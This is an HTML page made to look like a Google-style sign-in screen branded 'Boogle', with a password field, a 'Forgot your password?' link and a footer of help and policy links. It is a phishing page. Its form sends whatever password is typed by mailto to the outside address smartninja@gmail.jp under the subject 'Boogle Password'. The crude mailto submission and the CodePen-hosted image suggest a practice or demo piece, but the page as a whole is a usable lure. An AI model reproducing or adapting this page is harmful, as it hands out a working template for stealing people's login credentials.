<!DOCTYPE html>
<html>
<head>
<title>Boogle Login</title>
<link rel="stylesheet" href="login_style.css">
</head>
<body>

<main>
  <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/2480619/2019-01-22%2010_06_30-Window.png"></img>
  <h1>Welcome</h1>
  <form action="mailto:smartninja@gmail.jp?subject=Boogle Password" method="post" enctype="text/plain">
    <select>
      <option>smartninja@gmail.jp</option>
      <option>change account</option>
    </select>
    <div class="password_input">
      <div class="password_eye">
        <div class="annotation">Enter Password</div>
        <input type="password" name="psw"></input>
        <img src="https://img.icons8.com/windows/32/000000/invisible.png"></img>
      </div>
      <div class="password_send">
        <div class="password_help">Forgot your password?</div>
        <input type="submit" value="Submit">
      </div>
    </div>
  </form>
</main>

<footer>
  <select>
    <option value="English">English</option>
    <option value="Portugues">Portugues</option>
    <option value="Spanish">Spanish</option>   
  </select>
  <ul>
    <li>Help</li>
    <li>Privacy Policy</li>
    <li>Terms of Use</li>
  </ul>  
</footer>
<p>Sources: <a href="https://icons8.com/icon/22021/invisible">Invisible icon by Icons8</a>, <a href="https://icons8.com/icon/39942/expand-arrow">Expand Arrow icon by Icons8</a></p>
</body>
</html>
